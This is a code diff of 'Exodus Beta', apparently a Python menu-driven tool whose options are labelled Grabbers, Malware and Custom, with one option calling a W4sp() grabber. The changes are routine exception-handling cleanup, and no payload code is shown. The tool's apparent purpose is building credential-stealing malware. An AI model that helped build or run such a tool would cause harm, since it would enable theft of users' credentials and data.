@@ -11,12 +11,13 @@ from util.rpc import RPC
 from util.x import *
 from util.classes import *
 
-pacman()
+#pacman()
 x()
 RPC()
 Cursor.HideCursor()
 
 def Exodus():
+    
     try:
         while True:
             System.Title(f"Exodus Beta")
@@ -37,9 +38,7 @@ def Exodus():
             elif CH1 == '6':
                 exit()
         
-    except KeyboardInterrupt:
-        Exodus()
-    except EOFError:
+    except (KeyboardInterrupt, EOFError):
         Exodus()
 
 def Custom(): # Custom module
@@ -83,9 +82,7 @@ def Custom(): # Custom module
             if XH0 == '4':
                 Exodus()
     
-        except KeyboardInterrupt:
-            Custom()
-        except EOFError:
+        except (KeyboardInterrupt, EOFError):
             Custom()
     
 
@@ -148,9 +145,7 @@ def Grabbers():
         if grabber == '3':
             W4sp()
         
-    except KeyboardInterrupt:
-        Grabbers()
-    except EOFError:
+    except (KeyboardInterrupt, EOFError):
         Grabbers()
 
 def Malware():
@@ -173,9 +168,7 @@ def Malware():
         if malw == '3':
             Custom()
 
-    except KeyboardInterrupt:
-        Malware()
-    except EOFError:
+    except (KeyboardInterrupt, EOFError):
         Malware()
 
 
